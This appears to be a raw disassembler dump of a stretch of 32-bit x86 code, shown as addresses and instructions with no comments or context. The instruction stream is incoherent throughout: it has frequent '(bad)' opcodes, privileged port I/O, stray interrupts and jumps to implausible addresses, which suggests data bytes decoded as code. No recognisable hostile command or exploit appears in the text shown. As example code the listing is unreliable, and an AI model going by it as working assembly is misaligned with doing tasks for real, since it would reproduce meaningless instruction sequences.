  431de3:	and    eax,0x1de686a3
  431de8:	cmp    edi,edi
  431dea:	lea    esi,[ecx]
  431dec:	(bad)  
  431ded:	imul   ebx,DWORD PTR [esi+0x2e],0xd91486e9
  431df4:	test   eax,0xacaa9f00
  431dfa:	jle    0x431e2b
  431dfc:	fisttp QWORD PTR [esi]
  431dfe:	cmp    al,0xf4
  431e00:	sahf   
  431e01:	(bad)  
  431e02:	cmp    edx,ebp
  431e04:	push   ebp
  431e05:	or     eax,DWORD PTR [eax+0x55]
  431e08:	daa    
  431e09:	out    0x0,eax
  431e0b:	cwde   
  431e0c:	aad    0x3e
  431e0e:	jecxz  0x431d9c
  431e10:	xchg   edi,eax
  431e11:	fist   DWORD PTR [ecx-0xc56ad74]
  431e17:	push   0x2cd5a76f
  431e1c:	popf   
  431e1d:	jecxz  0x431de7
  431e1f:	sbb    eax,0xabd8c4ab
  431e24:	aad    0x70
  431e26:	jg     0x431e69
  431e28:	adc    eax,0xda6203e7
  431e2d:	mov    eax,ds:0xc39dd6f3
  431e32:	imul   DWORD PTR [ebp-0x14ffa5da]
  431e38:	push   ebp
  431e39:	add    esi,DWORD PTR [eax]
  431e3b:	in     eax,dx
  431e3c:	es out 0xa,eax
  431e3f:	adc    al,0x53
  431e41:	pop    ebx
  431e42:	loopne 0x431ded
  431e44:	(bad)  
  431e46:	add    ebx,ebp
  431e48:	out    dx,eax
  431e49:	adc    dl,BYTE PTR fs:[esi+0x78]
  431e4d:	pop    esi
  431e4e:	retf   
  431e4f:	fisub  WORD PTR [esi]
  431e51:	fiadd  DWORD PTR [eax+0xba22649]
  431e57:	mov    eax,0xf5bbcc
  431e5c:	ins    DWORD PTR es:[edi],dx
  431e5d:	fstp   DWORD PTR [esi-0x37]
  431e60:	pop    ebp
  431e61:	stos   BYTE PTR es:[edi],al
  431e62:	and    eax,DWORD PTR [eiz*8+0x110b6c01]
  431e69:	xchg   edi,eax
  431e6a:	ins    BYTE PTR es:[edi],dx
  431e6b:	rol    BYTE PTR [ecx-0x37],0x0
  431e6f:	sbb    DWORD PTR ds:0xd16e109b,eax
  431e75:	retf   0x9f09
  431e78:	sahf   
  431e79:	call   0xd3147cce
  431e7e:	stc    
  431e7f:	cld    
  431e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431e81:	leave  
  431e82:	inc    eax
  431e83:	jmp    0xf653ba64
  431e88:	mov    bl,0xe6
  431e8a:	xor    bl,BYTE PTR [ecx-0x65f354a8]
  431e90:	pop    eax
  431e91:	int    0xe4
  431e93:	fsub   DWORD PTR [ecx]
  431e95:	cmp    BYTE PTR es:[esi+0x7209aa35],dl
  431e9c:	jmp    0xd263a276
  431ea1:	fucomp st(0)
  431ea3:	sub    eax,0x70f9236a
  431ea8:	stc    
  431ea9:	aad    0x85
  431eab:	mov    dh,0x8c
  431ead:	adc    ebp,eax
  431eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431eb0:	add    eax,0x6862f926
  431eb5:	pop    ebp
  431eb6:	repnz pop esp
  431eb8:	mov    WORD PTR [ecx+0x2b],ss
  431ebb:	icebp  
  431ebc:	aam    0x99
  431ebe:	add    cl,al
  431ec0:	add    dh,dl
  431ec2:	sub    edi,ecx
  431ec4:	into   
  431ec5:	pop    esp
  431ec6:	in     eax,0x0
  431ec8:	cmp    ah,BYTE PTR [edx+0x58645625]
  431ece:	stos   BYTE PTR es:[edi],al
  431ecf:	sbb    BYTE PTR [esi-0x2b062610],dh
  431ed5:	mov    ecx,0x34e940d6
  431eda:	jmp    0x431e61
  431edc:	scas   al,BYTE PTR es:[edi]
  431edd:	dec    ecx
  431ede:	stc    
  431edf:	add    al,0xe9
  431ee1:	popa   
  431ee2:	pop    esi
  431ee3:	cli    
  431ee4:	fs jae 0x431e94
  431ee7:	call   0x88b65aec
  431eec:	sub    eax,0x3d4e7b
  431ef1:	add    al,BYTE PTR [ecx]
  431ef3:	or     DWORD PTR [ebx+0x47],esi
  431ef6:	fstp   QWORD PTR [ebx-0x5f]
  431ef9:	ja     0x431f49
  431efb:	cmp    eax,0xc9e5fa00
  431f00:	add    bh,BYTE PTR [ebx-0x27]
  431f03:	mov    ecx,0x4a0c9f83
  431f08:	mov    eax,DWORD PTR [edx+0x67548867]
  431f0e:	cmp    eax,0x39575c88
  431f13:	sub    bh,bh
  431f15:	mov    WORD PTR [ecx],gs
  431f17:	mov    ebp,0x37d90b12
  431f1c:	add    eax,0x3d4c2b
  431f21:	(bad)  
  431f22:	es mov cl,0xdd
  431f25:	add    BYTE PTR [ebx],bl
  431f27:	fld    DWORD PTR [eax]
  431f29:	jmp    0x43fe00
  431f2e:	call   0xb959:0xfb446a34
  431f35:	jbe    0xc431a57
  431f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431f3c:	shl    BYTE PTR [ebp-0xd],cl
  431f3f:	inc    esi
  431f40:	call   DWORD PTR [edi+0x22]
  431f43:	push   cs
  431f44:	sti    
  431f45:	dec    ebx
  431f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431f48:	add    dl,BYTE PTR [ebp+0x75]
  431f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431f4c:	enter  0xbd75,0x46
  431f50:	call   FWORD PTR [esi+0x42]
  431f53:	sbb    al,0xd
  431f55:	jae    0x431ede
  431f57:	fucom  st(7)
  431f59:	loopne 0x431f25
  431f5b:	fadd   DWORD PTR [eax]
  431f5d:	mov    edx,esp
  431f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431f60:	(bad)  
  431f61:	call   0xfa4c13c8
  431f66:	popf   
  431f67:	mov    bh,0xb8
  431f69:	and    ecx,DWORD PTR [edx-0x59]
  431f6c:	sbb    al,0x88
  431f6e:	(bad)  
  431f6f:	sbb    eax,0xae4de7e1
  431f74:	pop    es
  431f75:	cli    
  431f76:	jmp    0x431f76
  431f78:	loopne 0x431fb1
  431f7a:	cmp    ebp,esi
  431f7c:	mov    DWORD PTR [eax],edx
  431f7e:	sub    esp,DWORD PTR ds:0x321e6ee5
  431f84:	clc    
  431f85:	test   BYTE PTR [edx],dl
  431f87:	xor    ebp,edi
  431f89:	inc    DWORD PTR [eax]
  431f8b:	dec    ebx
  431f8c:	stos   DWORD PTR es:[edi],eax
  431f8d:	std    
  431f8e:	jmp    DWORD PTR [edx+0x8]
  431f91:	in     eax,0x52
  431f93:	inc    ebp
  431f94:	and    eax,0x32a67ab5
  431f99:	or     BYTE PTR [esi+esi*1],dl
  431f9c:	and    bh,BYTE PTR [ebp+0x7599d8ff]
  431fa2:	pop    ebx
  431fa3:	jle    0x431fab
  431fa5:	jp     0x431f7d
  431fa7:	xchg   edi,eax
  431fa8:	cmp    bl,BYTE PTR [ebx-0x69364af9]
  431fae:	add    BYTE PTR [edx+0x32],ah
  431fb1:	jl     0x431f7f
  431fb3:	cli    
  431fb4:	stc    
  431fb5:	add    eax,0xc0b8fdfa
  431fba:	and    ecx,DWORD PTR [esi-0x4b]
  431fbd:	cmp    eax,0xfc885a74
  431fc2:	pop    edx
  431fc3:	sti    
  431fc4:	fdivp  st(5),st
  431fc6:	jmp    DWORD PTR [edx-0x49]
  431fc9:	sub    eax,0x763ba27e
  431fce:	push   ebx
  431fcf:	xchg   BYTE PTR [edx],al
  431fd1:	jbe    0x432016
  431fd3:	jle    0x431faf
  431fd5:	jnp    0x431fb3
  431fd7:	leave  
  431fd8:	cmp    eax,0xd97e537c
  431fdd:	div    DWORD PTR [esi+0x21]
  431fe0:	std    
  431fe1:	(bad)  
  431fe2:	mov    bl,0x12
  431fe4:	mov    ds,WORD PTR [esi+0x3d]
  431fe7:	in     al,0x2d
  431fe9:	pusha  
  431fea:	xchg   DWORD PTR [ecx-0xb],eax
  431fed:	(bad)  
  431fee:	mov    dh,0x0
  431ff0:	lahf   
  431ff1:	and    bh,BYTE PTR [edx+0x7c]
  431ff4:	popf   
  431ff5:	dec    edi
  431ff6:	sub    esp,eax
  431ff8:	pop    ebp
  431ff9:	lock mov eax,ds:0xabd9a304
  431fff:	fistp  WORD PTR [ebp+0x52]
  432002:	stos   DWORD PTR es:[edi],eax
  432003:	fild   WORD PTR [ecx-0x10]
  432006:	push   ds
  432007:	jp     0x431fb2
  432009:	std    
  43200a:	out    dx,eax
  43200b:	jl     0x432038
  43200d:	xor    al,BYTE PTR [esi+0xb]
  432010:	dec    eax
  432011:	and    ebp,DWORD PTR [esi-0x49]
  432014:	add    ecx,0xd0b6436c
  43201a:	pop    esi
  43201b:	xchg   edi,eax
  43201c:	cmp    ebp,0xa7660a66
  432022:	pop    edi
  432023:	jl     0x431fae
  432025:	std    
  432026:	fild   DWORD PTR [edx+ebx*1-0x23386923]
  43202d:	(bad)  
  43202e:	retf   
  43202f:	fisttp WORD PTR [ebp-0x6e71a821]
  432035:	push   esp
  432036:	stos   DWORD PTR es:[edi],eax
  432037:	fild   WORD PTR [ecx-0x77]
  43203a:	cwde   
  43203b:	jl     0x431fe6
  43203d:	std    
  43203e:	push   DWORD PTR [ecx-0x778fd81c]
  432044:	inc    ecx
  432045:	jmp    0x23f53209
  43204a:	retf   0xa57b
  43204d:	dec    esi
  43204e:	sub    esp,eax
  432050:	sub    esi,0x9f007ba1
  432056:	out    dx,al
  432057:	add    BYTE PTR ds:0xaafdbec2,ah
  43205d:	pop    edi
  43205e:	popf   
  43205f:	and    al,0xf9
  432061:	mov    fs,WORD PTR cs:[ecx+eax*1]
  432065:	loope  0x432088
  432067:	add    ebx,DWORD PTR [ebx]
  432069:	pop    esi
  43206a:	pop    ebx
  43206b:	push   esp
  43206c:	lds    edi,FWORD PTR [ecx-0x6e32ab1f]
  432072:	test   al,0xff
  432074:	lods   al,BYTE PTR ds:[esi]
  432075:	or     DWORD PTR [esi-0x720722dc],edx
  43207b:	and    al,0xd9
  43207d:	clc    
  43207e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43207f:	and    al,0x5
  432081:	mov    BYTE PTR [edx],bl
  432083:	mov    bl,dh
  432085:	call   0x17344517
  43208a:	pop    edx
  43208b:	dec    eax
  43208c:	pop    ss
  43208d:	loope  0x4320f0
  43208f:	and    BYTE PTR [edi-0x62ece0ef],bl
  432095:	aaa    
  432096:	loop   0x432098
  432098:	(bad)  
  432099:	(bad)  
  43209b:	and    al,0x6a
  43209d:	mov    ds:0x3f247dce,al
  4320a2:	test   al,0x1a
  4320a4:	xchg   ebx,eax
  4320a5:	daa    
  4320a6:	xor    DWORD PTR ds:0x7d1f6516,edx
  4320ac:	adc    BYTE PTR [ebx-0x4e],ah
  4320af:	mov    dh,0x6a
  4320b1:	sbb    ecx,edx
  4320b3:	ins    DWORD PTR es:[edi],dx
  4320b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4320b5:	popa   
  4320b6:	fld    DWORD PTR [ebp-0x39e2ff83]
  4320bc:	data16 loopne 0x43207b
  4320bf:	lods   al,BYTE PTR ds:[esi]
  4320c0:	addr16 rol dh,cl
  4320c3:	pop    edx
  4320c4:	inc    esp
  4320c5:	add    eax,0xd4c5af2
  4320ca:	scas   al,BYTE PTR es:[edi]
  4320cb:	push   eax
  4320cc:	dec    eax
  4320cd:	or     eax,0x4867cd
  4320d2:	(bad)
  4320d5:	lea    ebp,[edi-0x4caf77f5]
  4320db:	mov    al,ds:0xed600540
  4320e0:	add    BYTE PTR [edi+ebx*4-0x3],0xbe
  4320e5:	add    edx,edx
  4320e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4320e8:	push   eax
  4320e9:	add    DWORD PTR [eax],ecx
  4320eb:	popf   
  4320ec:	add    al,0x3b
  4320ee:	ret    
  4320ef:	inc    esi
  4320f0:	adc    BYTE PTR [ebx],ch
  4320f2:	mov    edx,0x7bcc6165
  4320f7:	aad    0x0
  4320f9:	push   ecx
  4320fa:	jecxz  0x4320dc
  4320fc:	add    eax,0xbd568b01
  432101:	or     al,0xf6
  432103:	popa   
  432104:	sbb    eax,0x393fab30
  432109:	push   ebp
  43210a:	sbb    eax,0xb24759e
  43210f:	fcom   DWORD PTR [esp+eax*2]
  432112:	sub    bl,BYTE PTR ds:0x497b84f9
  432118:	das    
  432119:	call   FWORD PTR [esi]
  43211b:	popa   
  43211c:	or     eax,DWORD PTR [eax+0x0]
  43211f:	dec    ebx
  432120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432121:	icebp  
  432122:	mov    ecx,edi
  432124:	add    BYTE PTR ds:0x6a310689,cl
  43212a:	inc    esp
  43212b:	or     ebx,DWORD PTR [edx-0x11]
  43212e:	je     0x43212c
  432130:	mov    ds:0xd2c3e8c7,eax
  432135:	idiv   bh
  432137:	jle    0x43212c
  432139:	ins    DWORD PTR es:[edi],dx
  43213a:	pop    es
  43213b:	and    bl,0xe1
  43213e:	int3   
  43213f:	or     bl,ch
  432141:	add    BYTE PTR [ebx-0x76dac659],cl
  432147:	out    0xd8,al
  432149:	imul   eax,DWORD PTR [edx+eiz*2+0x32],0x78
  43214e:	ret    0x20c9
  432151:	js     0x432196
  432153:	xchg   dh,al
  432155:	ja     0x4321ca
  432157:	jle    0x43215f
  432159:	jbe    0x432199
  43215b:	push   0xffffffbb
  43215d:	shl    BYTE PTR [ebx],0x56
  432160:	mov    ecx,0xfbdb0bbf
  432165:	add    BYTE PTR [ecx+0x43782231],cl
  43216b:	inc    esi
  43216c:	add    dh,BYTE PTR [esi+0x3e]
  43216f:	outs   dx,BYTE PTR ds:[esi]
  432170:	xchg   ecx,eax
  432171:	cld    
  432172:	outs   dx,BYTE PTR ds:[esi]
  432173:	xor    dh,BYTE PTR es:[esi-0x2]
  432177:	(bad)  
  432179:	hlt    
  43217a:	outs   dx,BYTE PTR ds:[esi]
  43217b:	es xor dl,al
  43217e:	mov    edi,0x56a3cd14
  432183:	add    cl,ah
  432185:	out    dx,al
  432186:	fdivr  DWORD PTR [ebp-0x147fcdaa]
  43218c:	fisub  DWORD PTR [ebx-0x56]
  43218f:	push   ecx
  432190:	lods   eax,DWORD PTR ds:[esi]
  432191:	jge    0x432153
  432193:	and    esi,DWORD PTR [edx+0x42]
  432196:	jb     0x4321db
  432198:	jle    0x4321d4
  43219a:	lods   eax,DWORD PTR ds:[esi]
  43219b:	xchg   BYTE PTR [ebx],dh
  43219d:	sbb    al,BYTE PTR [ecx]
  43219f:	mov    ds:0x310432a2,eax
  4321a4:	fstp   TBYTE PTR ds:0x25252bd9
  4321aa:	ins    DWORD PTR es:[edi],dx
  4321ab:	adc    al,0xa2
  4321ad:	xor    al,BYTE PTR [eax-0x10ba9c09]
  4321b3:	xchg   BYTE PTR [esi+0x21f1ed0e],ch
  4321b9:	xor    ecx,DWORD PTR [edx-0x26aa16f8]
  4321bf:	adc    esp,DWORD PTR [ebx]
  4321c1:	(bad)  
  4321c3:	out    0x64,al
  4321c5:	fldcw  WORD PTR [esi-0x59]
  4321c8:	inc    ecx
  4321c9:	mov    ebp,0x2de61716
  4321ce:	pop    ebx
  4321cf:	mov    es,WORD PTR [eax+eiz*1-0x56aed79c]
  4321d6:	outs   dx,BYTE PTR ds:[esi]
  4321d7:	mov    bh,0x6
  4321d9:	fnstcw WORD PTR [edx-0x18b27eb1]
  4321df:	add    esp,DWORD PTR [edx+0x54]
  4321e2:	test   al,0x42
  4321e4:	(bad)
  4321e7:	cmc    
  4321e8:	add    al,dh
  4321ea:	sbb    DWORD PTR [edi],esi
  4321ec:	pushf  
  4321ed:	dec    ebp
  4321ee:	jbe    0x432217
  4321f0:	add    al,0xfc
  4321f2:	fcomp  DWORD PTR [edi+edi*4+0x41]
  4321f6:	loope  0x432205
  4321f8:	rcl    BYTE PTR ds:0x7b0f6d31,cl
  4321fe:	pop    ds
  4321ff:	data16 aas 
  432201:	pop    ecx
  432202:	push   esi
  432203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432204:	mov    cs,WORD PTR [edi+0x4e]
  432207:	stos   DWORD PTR es:[edi],eax
  432208:	fild   WORD PTR [ebp-0x77]
  43220b:	ins    BYTE PTR es:[edi],dx
  43220c:	mov    edi,0x76b7bd81
  432211:	mov    eax,ds:0x48b3fbf5
  432216:	call   0xc519105d
  43221b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43221c:	add    edi,DWORD PTR [ebp+0x638ee821]
  432222:	push   edx
  432223:	mov    bl,0xdf
  432225:	push   ebp
  432226:	xor    ah,ch
  432228:	shl    BYTE PTR [ebx],1
  43222a:	push   ebx
  43222b:	jae    0x43220c
  43222d:	in     eax,dx
  43222e:	(bad)  
  432230:	add    edi,DWORD PTR [esi+ebx*1+0x5e]
  432234:	xor    eax,0x4c12f05
  432239:	or     BYTE PTR [ebp+0x27],dl
  43223c:	(bad)  
  43223d:	push   esi
  43223e:	push   edx
  43223f:	add    BYTE PTR [ebp+0x15],bh
  432242:	ret    
  432243:	inc    ecx
  432244:	mov    dl,0x5a
  432246:	lods   al,BYTE PTR ds:[esi]
  432247:	nop
  432248:	sbb    bl,BYTE PTR [esi]
  43224a:	sbb    DWORD PTR [edx+0x3c],0xc49c3d00
  432251:	push   ecx
  432252:	pushf  
  432253:	int    0x0
  432255:	bound  ebx,QWORD PTR [eax-0x2ae011cc]
  43225b:	sbb    DWORD PTR cs:[ebx-0x187a32c5],0xffffffc9
  432263:	jb     0x432265
  432265:	jmp    0xe965becb
  43226a:	mov    ah,0xec
  43226c:	jge    0x432219
  43226e:	push   0xffffff9c
  432270:	cmp    ch,cl
  432272:	das    
  432273:	stos   BYTE PTR es:[edi],al
  432274:	adc    BYTE PTR [ebx],al
  432276:	pop    esi
  432277:	and    BYTE PTR [ebx],dh
  432279:	xor    ecx,esp
  43227b:	xchg   ebp,eax
  43227c:	add    BYTE PTR [esi+0x5b],bh
  43227f:	sbb    eax,0x345e2910
  432284:	adc    BYTE PTR [esi+0x28],ch
  432287:	mov    bh,0x8
  432289:	sub    dx,WORD PTR [ecx+0x2061a579]
  432290:	adc    eax,DWORD PTR [ecx+0x6f]
  432293:	cdq    
  432294:	add    BYTE PTR [esi+eiz*1-0x56],ah
  432298:	add    al,0xfb
  43229a:	and    DWORD PTR [ebx+0x696870bd],eax
  4322a0:	call   DWORD PTR [esi+0x38858b1c]
  4322a6:	fisttp DWORD PTR [esi]
  4322a8:	jae    0x43229f
  4322aa:	aam    0xd2
  4322ac:	call   0x11c843b
  4322b1:	push   0x0
  4322b3:	dec    eax
  4322b4:	fxam   
  4322b6:	ftst   
  4322b8:	loop   0x4322ba
  4322ba:	add    cl,ch
  4322bc:	mov    al,ds:0xdb0b6a10
  4322c1:	xor    al,0x48
  4322c3:	ins    BYTE PTR es:[edi],dx
  4322c4:	xchg   esi,eax
  4322c5:	add    bh,bh
  4322c7:	push   ss
  4322c8:	push   ds
  4322c9:	adc    BYTE PTR [eax-0x5],al
  4322cc:	cs adc bh,bh
  4322cf:	jne    0x432280
  4322d1:	add    bh,bh
  4322d3:	jbe    0x432262
  4322d5:	ja     0x43231b
  4322d7:	mov    ebx,0xaae814da
  4322dc:	cdq    
  4322dd:	add    BYTE PTR [ebp+0x3204a10b],al
  4322e3:	or     edi,DWORD PTR [eax+0x69c589bb]
  4322e9:	stc    
  4322ea:	pop    ebp
  4322eb:	clc    
  4322ec:	dec    eax
  4322ed:	cmp    DWORD PTR [ebx+ebx*2],eax
  4322f0:	scas   eax,DWORD PTR es:[edi]
  4322f1:	or     bh,bh
  4322f3:	mov    dh,0x91
  4322f5:	ja     0x43233b
  4322f7:	jnp    0x4322d3
  4322f9:	adc    al,0xfc
  4322fb:	stos   DWORD PTR es:[edi],eax
  4322fc:	cdq    
  4322fd:	add    bl,al
  4322ff:	push   es
  432300:	or     eax,0x19b8036d
  432305:	mov    ebx,0xf7d56151
  43230a:	xor    eax,0x445ab3
  43230f:	mov    esp,0xb10fcc1
  432314:	fnstcw WORD PTR [ebx-0x5b7dff7b]
  43231a:	pop    es
  43231b:	push   ecx
  43231c:	xor    ecx,ebx
  43231e:	div    DWORD PTR ds:0x4457f3
  432324:	ins    BYTE PTR es:[edi],dx
  432325:	rol    DWORD PTR [eax],0x11
  432328:	sti    
  432329:	fdivr  DWORD PTR [ebx-0xeb41baa]
  43232f:	mov    edi,DWORD PTR [ecx+0x51]
  432332:	div    DWORD PTR [edx+eiz*2+0x28]
  432336:	mov    dl,dh
  432338:	xchg   esi,eax
  432339:	and    al,0x4f
  43233b:	test   DWORD PTR [esi-0x25],edx
  43233e:	in     eax,0xd3
  432340:	std    
  432341:	sbb    edi,edi
  432343:	sub    esp,0xffffff9d
  432346:	repnz test DWORD PTR ds:0x1ae75f4c,ebx
  43234d:	xor    al,0xff
  43234f:	stc    
  432350:	cmp    eax,0x2d52c3dc
  432355:	loope  0x4322e2
  432357:	je     0x4322df
  432359:	mov    WORD PTR es:[esi+edi*2+0x2],?
  43235e:	mov    WORD PTR [esi+eax*4+0x3a],cs
  432362:	hlt    
  432363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432364:	sbb    eax,ebx
  432366:	pop    esi
  432367:	mov    esi,0x5254325e
  43236c:	or     eax,0xbb85faa7
  432371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432372:	iret   
  432373:	call   0xfa426763
  432378:	fld    DWORD PTR [edx-0x7f]
  43237b:	repnz add BYTE PTR [esi],cl
  43237e:	es pop eax
  432380:	dec    ebp
  432381:	adc    al,0x9b
  432383:	adc    DWORD PTR [esp+ecx*2-0xe],ebx
  432387:	add    al,0x7d
  432389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43238a:	(bad)  
  43238b:	pop    edi
  43238c:	test   DWORD PTR [esp+edx*1-0x584e42a4],ebx
  432393:	pusha  
  432394:	and    al,0x66
  432396:	pop    esp
  432397:	pop    eax
  432398:	test   DWORD PTR [eax-0x49],ecx
  43239b:	in     eax,dx
  43239c:	test   DWORD PTR [ebp+0x2f],ebp
  43239f:	aam    0xe8
  4323a1:	sti    
  4323a2:	(bad)  
  4323a4:	stc    
  4323a5:	fdivrp st(1),st
  4323a7:	js     0x4323c0
  4323a9:	fldenv [ebx]
  4323ab:	add    al,0x31
  4323ad:	xchg   ecx,eax
  4323ae:	fldenv [edx]
  4323b0:	js     0x4323f8
  4323b2:	lds    esi,FWORD PTR [ecx-0x6829200]
  4323b8:	inc    ebx
  4323b9:	bound  ebx,QWORD PTR [eax+0x23]
  4323bc:	adc    BYTE PTR ds:0x7ca6ebb,al
  4323c2:	xlat   BYTE PTR ds:[ebx]
  4323c3:	mov    dh,0xc3
  4323c5:	fwait
  4323c6:	jnp    0x432356
  4323c8:	lds    ebx,FWORD PTR [edx-0x27]
  4323cb:	mov    dh,0xc3
  4323cd:	xchg   edi,eax
  4323ce:	loop   0x4323fb
  4323d0:	sub    BYTE PTR [edx-0x5d],ch
  4323d3:	imul   BYTE PTR [esp+ebx*4]
  4323d6:	dec    esi
  4323d7:	repz adc ah,ah
  4323da:	fimul  WORD PTR ds:0x27cb51e1
  4323e0:	inc    esi
  4323e1:	add    BYTE PTR [edi-0x6b],dh
  4323e4:	add    ecx,DWORD PTR [esp+eax*2]
  4323e7:	sub    al,0xf6
  4323e9:	ret    
  4323ea:	pop    ss
  4323eb:	pop    ss
  4323ec:	jecxz  0x4323f1
  4323ee:	pop    ebx
  4323ef:	arpl   WORD PTR [edx-0x31e82ff0],si
  4323f5:	ret    0x267f
  4323f8:	ss pop edx
  4323fa:	xor    edx,DWORD PTR [eax-0x73]
  4323fd:	mov    WORD PTR [ebp-0x21],?
  432400:	add    ebp,DWORD PTR [eax]
  432402:	push   esi
  432403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432404:	lds    ebp,FWORD PTR [esi+esi*8]
  432407:	hlt    
  432408:	(bad)  [edi+edx*4]
  43240b:	sbb    esi,ebx
  43240d:	daa    
  43240e:	dec    esi
  43240f:	sbb    al,0xdb
  432411:	daa    
  432412:	jbe    0x432397
  432414:	pop    edx
  432415:	push   ss
  432416:	ret    0xa7c3
  432419:	add    ecx,edi
  43241b:	adc    eax,0xa62286db
  432420:	icebp  
  432421:	inc    esp
  432422:	mov    al,ds:0x3e791ade
  432427:	out    0x0,eax
  432429:	sub    edx,eax
  43242b:	jg     0x432482
  43242d:	sub    ebx,DWORD PTR [ecx-0x27]
  432430:	test   DWORD PTR [edi],ebp
  432432:	push   cs
  432433:	sub    BYTE PTR [ebp+0x35d53da5],al
  432439:	and    DWORD PTR [esi-0x75c6ca3f],edx
  43243f:	lds    esi,FWORD PTR [edi+esi*8+0x4e]
  432443:	pop    ebx
  432444:	push   eax
  432445:	fwait
  432446:	add    BYTE PTR [eax+0x4b951320],dl
  43244c:	cdq    
  43244d:	add    BYTE PTR [edx+0x1d],ch
  432450:	into   
  432451:	mov    al,0xe8
  432453:	enter  0x2f1b,0xa9
  432457:	mov    al,ds:0xd93f00d5
  43245c:	sub    ch,al
  43245e:	cmc    
  43245f:	popa   
  432460:	fld    DWORD PTR [eax]
  432462:	mov    edi,0xe808f52a
  432467:	sub    eax,0xbea785d8
  43246c:	outs   dx,BYTE PTR ds:[esi]
  43246d:	cli    
  43246e:	scas   al,BYTE PTR es:[edi]
  43246f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432470:	push   esp
  432471:	ret    0xa047
  432474:	aad    0x0
  432476:	aaa    
  432477:	jmp    0x5e6aa9a6
  43247c:	sbb    BYTE PTR [edx],al
  43247e:	sbb    DWORD PTR [ebx-0x5093ff67],edi
  432484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432485:	push   es
  432486:	jb     0x4324e7
  432488:	mov    bh,cl
  43248a:	sbb    DWORD PTR [esi-0x64],ebx
  43248d:	(bad)  
  43248f:	popa   
  432490:	and    BYTE PTR [edx-0xb],dh
  432493:	pop    esp
  432494:	(bad)  
  432495:	dec    esp
  432496:	cli    
  432497:	mov    eax,ds:0xac2785d9
  43249c:	xor    al,BYTE PTR [ecx+0x57]
  43249f:	inc    esp
  4324a0:	and    BYTE PTR [edi+0x0],cl
  4324a3:	fiadd  WORD PTR [ebx-0x7c3209d5]
  4324a9:	dec    esi
  4324aa:	push   0x0
  4324ac:	cmp    BYTE PTR [esi+ecx*2+0x4e1b2156],al
  4324b3:	mov    esi,DWORD PTR [edx+0x1a]
  4324b6:	or     eax,0x960dac
  4324bb:	test   DWORD PTR [ebx],edi
  4324bd:	mov    eax,ds:0xd5123d03
  4324c2:	stc    
  4324c3:	jg     0x432544
  4324c5:	shr    BYTE PTR [edx],cl
  4324c7:	rcl    BYTE PTR [eax-0x20],0x4f
  4324cb:	mov    edx,0x40bc7b
  4324d0:	xor    dh,ch
  4324d2:	adc    DWORD PTR [eax-0x35],eax
  4324d5:	sub    eax,0x1ab5f642
  4324da:	cmp    eax,0x3e
  4324dd:	sbb    ebp,DWORD PTR [ebp+0x4]
  4324e0:	imul   edx,DWORD PTR ds:0x1a581ae3,0x1ac32474
  4324ea:	or     eax,0x958850
  4324ef:	mov    edx,ebx
  4324f1:	dec    esi
  4324f2:	inc    DWORD PTR [eax+eiz*4-0xba8f960]
  4324f9:	test   DWORD PTR [eax],ecx
  4324fb:	xor    bh,BYTE PTR [ebx+0x365e577e]
  432501:	jl     0x4324bd
  432503:	add    al,0x8b
  432505:	dec    eax
  432506:	dec    esp
  432507:	and    al,0x9b
  432509:	test   BYTE PTR [esi+0x56],cl
  43250c:	dec    ebp
  43250d:	or     DWORD PTR [esi+0x56],0x0
  432511:	dec    eax
  432512:	xor    bh,0x50
  432515:	push   edi
  432516:	fs pop es
  432518:	push   edi
  432519:	ror    BYTE PTR [edi+esi*8],1
  43251c:	push   ecx
  43251d:	(bad)  
  43251e:	cli    
  43251f:	dec    ebp
  432520:	stc    
  432521:	outs   dx,DWORD PTR ds:[esi]
  432522:	jbe    0x432532
  432524:	inc    eax
  432525:	bound  eax,QWORD PTR [ebp-0x25ee8c0d]
  43252b:	js     0x432551
  43252d:	push   edx
  43252e:	push   esi
  43252f:	shr    BYTE PTR ds:0x664d7322,1
  432535:	popa   
  432536:	ins    BYTE PTR es:[edi],dx
  432537:	dec    BYTE PTR [edi-0x4e]
  43253a:	ins    BYTE PTR es:[edi],dx
  43253b:	pop    es
  43253c:	stc    
  43253d:	xchg   esi,eax
  43253e:	es sub ecx,edi
  432541:	outs   dx,DWORD PTR ds:[esi]
  432542:	ret    0x4013
  432545:	bound  eax,QWORD PTR [ebp+0x1e9e85bd]
  43254b:	or     eax,0x57b5a74
  432550:	push   eax
  432551:	in     eax,0x71
  432553:	add    eax,0x418a05e5
  432558:	or     BYTE PTR [edx],dl
  43255a:	add    ch,al
  43255c:	sahf   
  43255d:	xor    al,0x9a
  43255f:	jmp    0x4aef:0x8802c5ff
  432566:	jle    0x4325dc
  432568:	inc    esp
  432569:	(bad)  
  43256a:	lock sti 
  43256c:	adc    ecx,DWORD PTR [esi]
  43256e:	cmp    BYTE PTR ds:0x103ee100,bh
  432574:	test   DWORD PTR [eax],eax
  432576:	lods   al,BYTE PTR ds:[esi]
  432577:	push   0x51
  432579:	std    
  43257a:	xchg   ebp,eax
  43257b:	add    cl,BYTE PTR [eax+0x7f432cc2]
  432581:	in     al,dx
  432582:	cmp    cl,ch
  432584:	push   edx
  432585:	push   ecx
  432586:	mov    esp,0x62fffd70
  43258b:	lock xchg edi,esi
  43258e:	clc    
  43258f:	add    DWORD PTR [ecx+edi*8+0x4f],edx
  432593:	ficom  WORD PTR [edx]
  432595:	inc    eax
  432596:	(bad)  
  432597:	fldenv [esi-0x38]
  43259a:	data16 data16 stos BYTE PTR es:[edi],al
  43259d:	pop    es
